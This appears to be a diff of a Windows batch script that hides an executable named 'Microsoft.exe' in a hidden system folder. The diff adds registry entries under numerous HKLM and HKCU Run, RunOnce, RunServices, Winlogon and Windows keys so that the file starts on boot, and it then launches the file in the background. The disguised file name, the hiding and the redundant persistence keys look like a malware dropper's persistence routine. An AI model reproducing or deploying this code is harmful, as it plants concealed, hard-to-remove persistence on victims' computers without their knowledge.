@@ -121,7 +121,19 @@ REM Set hidden attribute for files
 attrib +h +s "%hiddenFolder2%\Microsoft.exe"
 
 REM Add registry key to start Microsoft.exe on boot
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft.exe" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f
+
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
 
 start /B Microsoft.exe"
 
